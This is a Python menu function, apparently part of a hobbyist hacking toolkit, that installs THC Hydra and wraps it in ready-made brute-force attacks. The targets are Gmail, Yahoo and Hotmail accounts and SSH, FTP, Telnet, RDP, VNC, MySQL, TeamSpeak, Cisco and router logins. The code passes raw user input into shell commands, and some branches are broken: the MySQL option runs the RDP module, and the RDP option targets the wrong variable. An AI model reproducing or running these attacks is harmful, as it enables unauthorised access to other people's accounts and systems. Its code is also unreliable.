def hydra():
     print("1.Dowload Hydra")
     print("2.Cisco bruteforce")
     print("3.FTP bruteforce")
     print("4.Gmail bruteforce")
     print("5.SSH bruteforce")
     print("6.Telnet bruteforce")
     print("7.Yahoo mail bruteforce")
     print("8.Hotmail bruteforce")
     print("9.Router speedy bruteforce")
     print("10.RDP bruteforce")
     print("11.MySql bruteforce")
     print("12.Teamspeak bruteforce")
     print()
     i = input("[Hydra~>")
     if i == 'hydra':
     	os.system("clear")
     	print("Installing Hydra")
     	os.system("pkg install hydra")
     elif i == 'cisco':
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -P %s %s cisco" % (j, w))
     	hydra()
     elif i == 'ftp':
     	os.system("clear")
     	u = input("User : ")
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s %s ftp" % (u, j, w))
     	hydra()
     elif i == 'vnc':
     	os.system("clear")
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -P %s -e n -t 1 %s vnc -V" % (j, w))
     	hydra()
     elif i == 'gmail':
     	os.system("clear")
     	e = input("Email : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (e, j))
     	hydra()
     elif i == 'ssh':
     	os.system("clear")
     	u = input("User : ")
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s %s ssh" % (u,j, w))
     	hydra()
     elif i == 'telnet':
     	os.system("clear")
     	u = input("User : ")
     	w = input("Enter IP : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s %s telnet" % (u, j, w))
     	hydra()
     elif i == 'yahoo':
     	os.system("clear")
     	e = input("Email : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (e, j))
     	hydra()
     elif i == 'hotmail':
     	os.system("clear")
     	e = input("Email : ")
     	j = input("Wordlist : ")
     	os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (e, j))
     	hydra()
     elif i == 'router':
     	os.system("clear")
     	u = input("User : ")
     	e = input("Email : ")
     	j = input("Wordlist : ")
     	os.system("hydra -m / -l %s -P %s %s http-get" % (u, j, e))
     	hydra()
     elif i == 'rdp':
     	os.system("clear")
     	u = input("User :")
     	e = input("Email :")
     	j = input("Wordlist :")
     	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
     	hydra()
     elif i == 'mysql':
     	os.system("clear")
     	u = input("User :")
     	i = input("Enter IP : ")
     	j = input("'Wordlist :")
     	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
     	hydra()
     elif i == 'teamspeak':
        u = input("User :")
        i = input("IP :")
        j = input("Wordlist :")
        os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (u, j, i))
        hydra()
     elif i == 'help':
        os.system("clear")
        print("\n TYPE THIS COMMANDS  : \n hydra - To install hydra \n cisco - Cisco bruteforce \n ftp - FTP bruteforce \n vnc - vnc bruteforce \n gmail - Gmail bruteforce \n yahoo - Yahoo bruteforce \n telnet - Telnet bruteforce \n teamspeak - Teamspek bruteforce \n mysql - MySql bruteforce \n rdp - RDP briteforce \n router - Router bruteforce \n hotmail - Hotmail bruteforce \n help - For help \n clear - Clearing terminal \n  back - To go back to pearl console")
        hydra()
     elif i == 'clear':
     	os.system("clear")
     	hydra()
     elif i == 'back':
     	main()
     else:
     	print("[!] Invalid input")
     	print("[!] Try again")
     	print()
     	hydra()
		
